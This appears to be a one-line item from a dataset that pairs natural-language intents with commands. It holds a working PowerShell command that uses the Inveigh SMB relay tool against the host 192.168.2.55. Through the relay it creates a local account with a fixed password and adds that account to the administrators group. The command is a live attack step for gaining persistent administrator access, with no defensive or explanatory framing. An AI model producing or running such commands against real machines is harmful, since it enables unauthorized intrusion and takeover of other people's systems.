# Natural language intent:
# Invoke Inveigh Relay to perform user and group manipulation on a specified target.

Invoke-InveighRelay -Target 192.168.2.55 -Command 'net user Inveigh Spring2017 /add && net localgroup administrators Inveigh /add'
